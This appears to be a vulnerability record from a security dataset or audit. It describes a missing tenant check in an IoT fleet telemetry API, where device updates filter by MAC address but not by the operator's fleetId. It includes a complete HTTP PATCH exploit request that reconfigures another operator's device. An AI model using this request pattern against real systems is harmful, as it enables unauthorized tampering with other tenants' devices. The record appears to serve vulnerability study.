diagnosis: The telemetry update endpoint uses Joi validation for MAC address format and payload limits, but the Mongoose update query filters only by macAddress without including the authenticated operator's fleetId, allowing any authenticated fleet operator to reconfigure telemetry parameters on other operators' IoT devices.
exploit_request:
PATCH /v1/fleet/devices/00:1B:44:11:3A:B7/telemetry HTTP/1.1
Host: iot.fleetgrid.io:3001
Authorization: Bearer <west_operator_token>
Content-Type: application/json

{"heartbeatIntervalSec": 3600}
